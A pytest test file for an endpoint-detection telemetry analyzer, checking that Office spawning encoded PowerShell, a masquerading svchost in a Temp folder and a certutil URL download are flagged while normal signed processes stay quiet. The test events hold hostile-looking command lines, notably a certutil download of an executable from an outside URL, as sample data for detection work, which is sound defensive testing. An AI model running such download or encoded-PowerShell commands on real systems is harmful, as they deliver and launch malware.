"""Tests for projects/edr-telemetry-analyzer/edr_telemetry_analyzer.py.

The behavior judgments under test: an Office app spawning PowerShell is
the loudest signal in endpoint telemetry and must come out HIGH, a
masquerading svchost must be caught by its parent, and the ordinary
signed software on the same hosts must stay quiet or nearly so. A
detection tool that flags everything flags nothing.
"""

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

PROJECT = Path(__file__).resolve().parents[1] / "projects" / "edr-telemetry-analyzer"
SCRIPT = PROJECT / "edr_telemetry_analyzer.py"
SAMPLE = PROJECT / "sample_telemetry.json"

spec = importlib.util.spec_from_file_location("edr_telemetry_analyzer", SCRIPT)
edr = importlib.util.module_from_spec(spec)
spec.loader.exec_module(edr)


def load_sample():
    return json.loads(SAMPLE.read_text())


def severities(alerts):
    return {s for s, _ in alerts}


def test_office_spawning_powershell_is_high():
    event = {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "command_line": "powershell.exe -enc aQBmAA==",
        "signed": True,
    }
    alerts = edr.analyze_event(event)
    assert "HIGH" in severities(alerts)
    assert any("spawned" in reason for _, reason in alerts)
    assert any("encoded" in reason for _, reason in alerts)


def test_masquerading_svchost_is_caught_by_parent():
    event = {
        "image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost.exe",
        "parent_image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoicehelper.exe",
        "command_line": "svchost.exe",
        "signed": False,
    }
    reasons = " ".join(reason for _, reason in edr.analyze_event(event))
    assert "masquerade" in reasons
    assert "temp path" in reasons


def test_real_svchost_under_services_is_quiet():
    event = {
        "image": "C:\\Windows\\System32\\svchost.exe",
        "parent_image": "C:\\Windows\\System32\\services.exe",
        "command_line": "svchost.exe -k netsvcs",
        "signed": True,
    }
    assert edr.analyze_event(event) == []


def test_certutil_download_is_flagged():
    event = {
        "image": "C:\\Windows\\System32\\certutil.exe",
        "parent_image": "C:\\Windows\\explorer.exe",
        "command_line": "certutil.exe -urlcache -f http://example.com/x.exe x.exe",
        "signed": True,
    }
    assert "MEDIUM" in severities(edr.analyze_event(event))


def test_sample_data_flags_the_chain_not_the_browsing():
    flagged = edr.analyze(load_sample())
    assert len(flagged) == 6
    flagged_images = {edr.image_name(e["image"]) for e, _ in flagged}
    assert "chrome.exe" not in flagged_images
    assert "msedge.exe" not in flagged_images
    assert "winword.exe" not in flagged_images  # Word itself is fine; what it spawned is not


def test_cli_runs_on_sample():
    result = subprocess.run([sys.executable, str(SCRIPT), str(SAMPLE)], capture_output=True, text=True)
    assert result.returncode == 0
    assert "Events with alerts: 6" in result.stdout
    assert "[HIGH]" in result.stdout


def test_missing_argument_prints_usage():
    result = subprocess.run([sys.executable, str(SCRIPT)], capture_output=True, text=True)
    assert result.returncode == 1
    assert "Usage" in result.stdout
